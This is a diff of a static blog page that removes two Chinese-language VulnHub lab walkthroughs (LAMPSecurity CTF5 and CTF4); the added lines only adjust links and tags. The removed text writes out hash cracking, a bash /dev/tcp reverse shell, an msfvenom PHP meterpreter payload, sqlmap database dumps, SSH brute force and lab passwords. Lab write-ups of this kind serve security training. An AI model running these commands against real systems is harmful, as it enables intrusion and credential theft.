-<p><img src="/images/image-20230322091931405.png" alt="image-20230322091931405"></p>
-<h3 id="3-2-NanoCMS-HASH泄露"><a href="#3-2-NanoCMS-HASH泄露" class="headerlink" title="3.2 NanoCMS HASH泄露"></a>3.2 NanoCMS HASH泄露</h3><h4 id="3-2-1-CMS-框架识别"><a href="#3-2-1-CMS-框架识别" class="headerlink" title="3.2.1 CMS 框架识别"></a>3.2.1 CMS 框架识别</h4><p>​	在<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php%E9%A1%B5%E9%9D%A2%E4%B8%ADF12%E6%89%93%E5%BC%80%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%8C%E5%9C%A8/">http://192.168.70.193/~andy/index.php页面中F12打开控制台，在\</a>&lt;meta&gt;标签中泄露了当前页面所使用的是 NanoCMS</p>
-<p><img src="/images/image-20240314154429622.png" alt="image-20240314154429622"></p>
-<h4 id="3-2-2-NanoCMS-历史漏洞"><a href="#3-2-2-NanoCMS-历史漏洞" class="headerlink" title="3.2.2 NanoCMS 历史漏洞"></a>3.2.2 NanoCMS 历史漏洞</h4><p>​	在一些公开的漏洞库中可以查询到NanoCMS在低版本中存在漏洞，我们可以通过<code>NanoCMS密码hash泄露</code>获取到我们想要的管理员信息，访问<code>http://192.168.134.152/~andy/data/pagesdata.txt</code>，对password字段进行md5解密获取到以下信息:</p>
-<p><img src="/images/image-20230322092821310.png" alt="image-20230322092821310"></p>
-<p>​	对获取到的password的hash值进行判断，使用的加密方式</p>
-<blockquote>
-<p>hash-identifier 判断获取的hash散列值可能的加密方式</p>
-</blockquote>
-<p><img src="/images/image-20240314154715200.png" alt="image-20240314154715200"></p>
-<p>​	对散列值进行暴力破解</p>
-<blockquote>
-<p>hashcat -a 0 -m 0 9d2f75377ac0ab991d40c91fd27e52fd &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </p>
-</blockquote>
-<p><img src="/images/image-20240314155417087.png" alt="image-20240314155417087"></p>
-<p>​	获取到登录接口的一个账号密码</p>
-<blockquote>
-<p>username: admin</p>
-<p>password: shannon</p>
-</blockquote>
-<h3 id="3-3-前端后台获取shell"><a href="#3-3-前端后台获取shell" class="headerlink" title="3.3 前端后台获取shell"></a>3.3 前端后台获取shell</h3><h4 id="3-3-1-登录前端后台"><a href="#3-3-1-登录前端后台" class="headerlink" title="3.3.1 登录前端后台"></a>3.3.1 登录前端后台</h4><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php?page=home%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%88%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8Login%E6%8E%A5%E5%8F%A3">http://192.168.70.193/~andy/index.php?page=home，观察到当前页面存在Login接口</a></p>
-<p><img src="/images/image-20240314155208870.png" alt="image-20240314155208870"></p>
-<p>​		点击‘Admin Login’，跳转到<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/data/nanoadmin.php%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8A%E9%9D%A2%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://192.168.70.193/~andy/data/nanoadmin.php，使用上面泄露出来的账号密码进行登录</a></p>
-<p><img src="/images/image-20240314155316769.png" alt="image-20240314155316769"></p>
-<p>​		对Admin界面的功能点进行一波测试</p>
-<p><img src="/images/image-20230322093129087.png" alt="image-20230322093129087"></p>
-<h4 id="3-3-2-管理员后台命令执行漏洞"><a href="#3-3-2-管理员后台命令执行漏洞" class="headerlink" title="3.3.2 管理员后台命令执行漏洞"></a>3.3.2 管理员后台命令执行漏洞</h4><p>​		这里重点关注‘New Page’功能模块，这里存在这一处命令执行漏洞，下面是验证过程：</p>
-<p><img src="/images/image-20230322093224661.png" alt="image-20230322093224661"></p>
-<p>​		创建页面成功后，就提示你新的页面在 pages&#x2F;echo-hello.php</p>
-<p><img src="/images/image-20230322093308863.png" alt="image-20230322093308863"></p>
-<p>​		访问<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/pages/echo-hello.php%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C">http://192.168.70.193/~andy/pages/echo-hello.php，发现命令成功执行</a></p>
-<p><img src="/images/image-20230322093322393.png" alt="image-20230322093322393"></p>
-<p>​		这样我们就简单了，我们可以通过反弹shell获取到会话：</p>
-<blockquote>
-<ol>
-<li><p>bash 反弹shell</p>
-<blockquote>
-<p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[: ip]&#x2F;[: port] 0&gt;&amp;1</p>
-</blockquote>
-</li>
-<li><p>后端脚本语言反弹shell</p>
-</li>
-</ol>
-</blockquote>
-<h3 id="3-4-MSF生成PHP后门GetShell"><a href="#3-4-MSF生成PHP后门GetShell" class="headerlink" title="3.4 MSF生成PHP后门GetShell"></a>3.4 MSF生成PHP后门GetShell</h3><h4 id="3-4-1-生成PHP反弹shell的后门代码"><a href="#3-4-1-生成PHP反弹shell的后门代码" class="headerlink" title="3.4.1 生成PHP反弹shell的后门代码"></a>3.4.1 生成PHP反弹shell的后门代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.134.147 LPORT=4444 -f raw</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230322093806689.png" alt="image-20230322093806689"></p>
-<h4 id="3-4-2-New-Page-上传后门代码"><a href="#3-4-2-New-Page-上传后门代码" class="headerlink" title="3.4.2 New Page 上传后门代码"></a>3.4.2 New Page 上传后门代码</h4><p><img src="/images/image-20230322093915630.png" alt="image-20230322093915630"></p>
-<h4 id="3-4-3-设置MSFCONSOLE监听"><a href="#3-4-3-设置MSFCONSOLE监听" class="headerlink" title="3.4.3 设置MSFCONSOLE监听"></a>3.4.3 设置MSFCONSOLE监听</h4><p><img src="/images/image-20230322094241882.png" alt="image-20230322094241882"></p>
-<h4 id="3-4-4-访问后门文件，成功反弹shell"><a href="#3-4-4-访问后门文件，成功反弹shell" class="headerlink" title="3.4.4 访问后门文件，成功反弹shell"></a>3.4.4 访问后门文件，成功反弹shell</h4><p>​		经过简单的测试发现当前用户为apache，所以我们需要对此进行提权</p>
-<p><img src="/images/image-20230322094553555.png" alt="image-20230322094553555"></p>
-<h4 id="3-4-5-隐藏日志，成功获取到root权限"><a href="#3-4-5-隐藏日志，成功获取到root权限" class="headerlink" title="3.4.5 隐藏日志，成功获取到root权限"></a>3.4.5 隐藏日志，成功获取到root权限</h4><p>​		对所有文件路径一次访问，在<code>/home/patrick</code>目录下发现隐藏文件路径，</p>
-<p><img src="/images/image-20230322094717490.png" alt="image-20230322094717490"></p>
-<p>​		这里我们需要了解一下什么是”tomboy”，这样也就知道了我们为什么要关注tomboy这个文件夹</p>
-<blockquote>
-<p>一个linux系统下桌面即时贴软件，可以记录文字，是一个小巧、易用、跨系统的桌面便笺工具</p>
-</blockquote>
-<p>​		我们查看便签中的最新记录，就可以发现root用户的账号密码</p>
-<p><img src="/images/image-20230322094910413.png" alt="image-20230322094910413"></p>
-<blockquote>
-<h3 id="切换管理员账号"><a href="#切换管理员账号" class="headerlink" title="切换管理员账号"></a>切换管理员账号</h3><p>su root </p>
-</blockquote>
-<p><img src="/images/image-20230322095518004.png" alt="image-20230322095518004"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="clu01k36k000fcuvd5aaodzzj" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-vulnhub-LAMPSecurity-CTF4-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" class="article-date">
-  <time class="dt-published" datetime="2024-03-14T06:14:26.000Z" itemprop="datePublished">2024-03-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/">vulnhub-LAMPSecurity-CTF4.md</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF4-靶场"><a href="#CTF4-靶场" class="headerlink" title="CTF4 靶场"></a>CTF4 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
-<thead>
-<tr>
-<th>主机</th>
-<th>IP</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>攻击机</td>
-<td>192.168.134.1</td>
-</tr>
-<tr>
-<td>靶机</td>
-<td>192.168.134.136</td>
-</tr>
-</tbody></table>
-<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
-<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
-</blockquote>
-<p><img src="/images/image-20230317130307367.png" alt="image-20230317130307367"></p>
-<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
-<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.136</p>
-</blockquote>
-<p><img src="/images/image-20230317131853119.png" alt="image-20230317131853119"></p>
-<p>​	可以看到在靶机上开放了22、25、80端口。</p>
-<h3 id="2-2-UDP服务开放性探测"><a href="#2-2-UDP服务开放性探测" class="headerlink" title="2.2 UDP服务开放性探测"></a>2.2 UDP服务开放性探测</h3><blockquote>
-<p>sudo nmap –min-rate 10000 -p- -sU -v 192.168.134.136</p>
-</blockquote>
-<p><img src="/images/image-20230317135745160.png" alt="image-20230317135745160"></p>
-<h3 id="2-3-TCP服务开放性探测"><a href="#2-3-TCP服务开放性探测" class="headerlink" title="2.3 TCP服务开放性探测"></a>2.3 TCP服务开放性探测</h3><blockquote>
-<p>sudo nmap -sT -sV -sC -O -A -v 192.168.134.136</p>
-</blockquote>
-<p><img src="/images/1679033260389.png" alt="1679033260389"></p>
-<p>​	可以看到在靶机上开放的80端口上，已经扫描出了几个目录:&#x2F;email、&#x2F;restricted、&#x2F;conf、&#x2F;sql、&#x2F;admin</p>
-<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
-<p>sudo nmap –script&#x3D;vuln -p 192.168.134.136</p>
-</blockquote>
-<p><img src="/images/image-20240314113356470.png" alt="image-20240314113356470"></p>
-<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/">http://192.168.134.136</a> 根目录，对站点多个功能点进行访问测试，初步认定为blog站点</p>
-<p><img src="/images/image-20230317132926092.png" alt="image-20230317132926092"></p>
-<p>​	根据nmap扫描结果，扫描出的可以路径进行访问:</p>
-<p><img src="/images/image-20240314113213187.png" alt="image-20240314113213187"></p>
-<h4 id="3-1-1-访问-http-192-168-134-136-mail-src-login-php"><a href="#3-1-1-访问-http-192-168-134-136-mail-src-login-php" class="headerlink" title="3.1.1 访问 http://192.168.134.136/mail/src/login.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/mail/src/login.php">http://192.168.134.136/mail/src/login.php</a>:</h4><p>​	在该路径上部署了一个邮件系统，尝试使用弱口令进行爆破，无解。</p>
-<p><img src="/images/image-20240314120037082.png" alt="image-20240314120037082"></p>
-<h4 id="3-1-2-访问-http-192-168-134-136-restricted"><a href="#3-1-2-访问-http-192-168-134-136-restricted" class="headerlink" title="3.1.2 访问 http://192.168.134.136/restricted:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/restricted">http://192.168.134.136/restricted</a>:</h4><p>​	访问过程中出现身份认证，尝试使用弱口令进行爆破，无解。</p>
-<p><img src="/images/image-20240314120522533.png" alt="image-20240314120522533"></p>
-<h4 id="3-1-3-访问-http-192-168-134-136-conf"><a href="#3-1-3-访问-http-192-168-134-136-conf" class="headerlink" title="3.1.3 访问 http://192.168.134.136/conf:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/conf">http://192.168.134.136/conf</a>:</h4><p><img src="/images/image-20240314120634039.png" alt="image-20240314120634039"></p>
-<h4 id="3-1-4-访问-http-192-168-134-136-sql"><a href="#3-1-4-访问-http-192-168-134-136-sql" class="headerlink" title="3.1.4 访问 http://192.168.134.136/sql:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/sql">http://192.168.134.136/sql</a>:</h4><p>​	尝试访问&#x2F;sql路径，发现存在db.sql文件，</p>
-<p><img src="/images/image-20240314120747664.png" alt="image-20240314120747664"></p>
-<p>​	那么我们就继续访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/sql/db.sql">http://192.168.134.136/sql/db.sql</a>:</p>
-<p><img src="/images/image-20240314120840891.png" alt="image-20240314120840891"></p>
-<p>​	存储的内容时创建用户时所用的SQL，并为出现初始化的用户数据</p>
-<h4 id="3-1-5-访问-http-192-168-134-136-admin"><a href="#3-1-5-访问-http-192-168-134-136-admin" class="headerlink" title="3.1.5 访问 http://192.168.134.136/admin:"></a>3.1.5 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/admin">http://192.168.134.136/admin</a>:</h4><p>​	尝试使用弱口令进行爆破，无解。</p>
-<p><img src="/images/image-20240314120914483.png" alt="image-20240314120914483"></p>
-<h3 id="3-2-发现SQL注入点，尝试dump所有数据"><a href="#3-2-发现SQL注入点，尝试dump所有数据" class="headerlink" title="3.2 发现SQL注入点，尝试dump所有数据"></a>3.2 发现SQL注入点，尝试dump所有数据</h3><p>​	继续翻看Nmap扫描结果发现在首页index.html存在CSRF和SQL Injection</p>
-<p><img src="/images/image-20240314121620456.png" alt="image-20240314121620456"></p>
-<p><img src="/images/image-20240314121609312.png" alt="image-20240314121609312"></p>
-<p>​	查看Blog博客界面发现在<code>http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2%27</code>处的id参数存在SQL注入</p>
-<p><img src="/images/image-20230317134552420.png" alt="image-20230317134552420"></p>
-<p>​		我们直接SQLmap一把梭哈，获取到一些一些用户名密码，我们将它记录下来(下面是获取当前表单用户内容的执行方法，其他表单获取数据与下述方法类似)：</p>
-<blockquote>
-<h3 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –banner</p>
-<h3 id="获取当前所使用的数据库"><a href="#获取当前所使用的数据库" class="headerlink" title="获取当前所使用的数据库"></a>获取当前所使用的数据库</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql –dbs</p>
-<h3 id="获取当前所使用的数据库中的所有表单"><a href="#获取当前所使用的数据库中的所有表单" class="headerlink" title="获取当前所使用的数据库中的所有表单"></a>获取当前所使用的数据库中的所有表单</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql -D ehks –tables</p>
-<h3 id="获取当前所使用数据库中user表单中的所有数据"><a href="#获取当前所使用数据库中user表单中的所有数据" class="headerlink" title="获取当前所使用数据库中user表单中的所有数据"></a>获取当前所使用数据库中user表单中的所有数据</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql -D ehks -T user –dump</p>
-</blockquote>
-<h4 id="3-2-1-执行结果"><a href="#3-2-1-执行结果" class="headerlink" title="3.2.1 执行结果"></a>3.2.1 执行结果</h4><p><img src="/images/image-20230317140437567.png" alt="image-20230317140437567"></p>
-<p><img src="/images/image-20230317141252280.png" alt="image-20230317141252280"></p>
-<p><img src="/images/1679033670529.png" alt="1679033670529"></p>
-<p><img src="/images/image-20230317141553594.png" alt="image-20230317141553594"></p>
-<h4 id="3-2-2-其他用户表单中数据"><a href="#3-2-2-其他用户表单中数据" class="headerlink" title="3.2.2 其他用户表单中数据"></a>3.2.2 其他用户表单中数据</h4><p>​	calendar.phpc_user</p>
-<p><img src="/images/image-20240314122716884.png" alt="image-20240314122716884"></p>
-<p>​	roundcubemail.users</p>
-<p><img src="/images/image-20240314122820322.png" alt="image-20240314122820322"></p>
-<h3 id="3-3-SSH链接爆破"><a href="#3-3-SSH链接爆破" class="headerlink" title="3.3 SSH链接爆破"></a>3.3 SSH链接爆破</h3><p>​	将跑出来的数据划分成爆破用的字典</p>
-<blockquote>
-<h3 id="生成对应的用户名字典"><a href="#生成对应的用户名字典" class="headerlink" title="生成对应的用户名字典"></a>生成对应的用户名字典</h3><p>cat ehks_user.txt | awk -F’|’ ‘{print $3}’ &gt;&gt; username.txt</p>
-<h3 id="生成对应的密码字典"><a href="#生成对应的密码字典" class="headerlink" title="生成对应的密码字典"></a>生成对应的密码字典</h3><p>cat ehks_user.txt | awk -F’|’ ‘{print $4}’ | awk -F’[()]’ ‘{print $2}’ &gt;&gt; password.txt</p>
-<h3 id="使用爆破工具爆破SSH链接"><a href="#使用爆破工具爆破SSH链接" class="headerlink" title="使用爆破工具爆破SSH链接"></a>使用爆破工具爆破SSH链接</h3><p>crackmapexec ssh 192.168.134.136 -p password -u username.txt –continue-on-success</p>
-<p>​	–continue-on-success 表示当爆破出来后继续爆破</p>
-</blockquote>
-<p><img src="/images/image-20230317151548630.png" alt="image-20230317151548630"></p>
-<p>​		尝试使用上面的用户名和密码进行SSH链接</p>
-<blockquote>
-<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#x64;&#115;&#x74;&#101;&#118;&#101;&#x6e;&#115;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x33;&#x34;&#46;&#x31;&#x33;&#x36;">&#x64;&#115;&#x74;&#101;&#118;&#101;&#x6e;&#115;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x33;&#x34;&#46;&#x31;&#x33;&#x36;</a></p>
-</blockquote>
-<p><img src="/images/image-20230317144444254.png" alt="image-20230317144444254"></p>
-<p>​		成功连接上主机，可以发现我们是一个低权限账号，下面我们就该提权限了</p>
-<p><img src="/images/image-20230317152116430.png" alt="image-20230317152116430"></p>
-<h3 id="3-4-权限提升"><a href="#3-4-权限提升" class="headerlink" title="3.4 权限提升"></a>3.4 权限提升</h3><p>​	使用 <code>sudo -l</code> 列出当前用户在系统上可执行的命令和特权的命令，发现是<code>(ALL)ALL</code></p>
-<p><img src="/images/image-20240314123021307.png" alt="image-20240314123021307"></p>
-<p>​		那么就不用说了，直接 sudo 提权</p>
-<blockquote>
-<p>sudo su</p>
-<p>密码: ilike2surf</p>
-</blockquote>
-<p><img src="/images/image-20230317153014419.png" alt="image-20230317153014419"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="clu01k36e000bcuvd6fnfgoxn" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="clu0qloqm000d1ovd8dpw50eg" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1016,6 +996,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -1028,7 +1013,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
     </div>
   </div>
 
@@ -1038,7 +1023,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16.67px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 17.5px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
     </div>
   </div>
 
@@ -1060,23 +1045,23 @@
       <ul>
         
           <li>
+            <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/">vulnhub-LAMPSecurity-CTF7-initial-error</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/">vulnhub-LAMPSecurity-CTF7</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/">vulnhub-LAMPSecurity-CTF7-external</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/21/tools-sqlmap-script-build/">tools-sqlmap-script-build</a>
           </li>
         
           <li>
             <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/">pwn-stackoverflow-ret2shellcode</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/20/pwn-stackoverflow-ret2text/">pwn-stackoverflow-ret2text</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/17/tools-cs-msf-exchange/">tools_cs_msf_exchange</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/15/protocol-arp/">protocol-arp</a>
           </li>
         
       </ul>
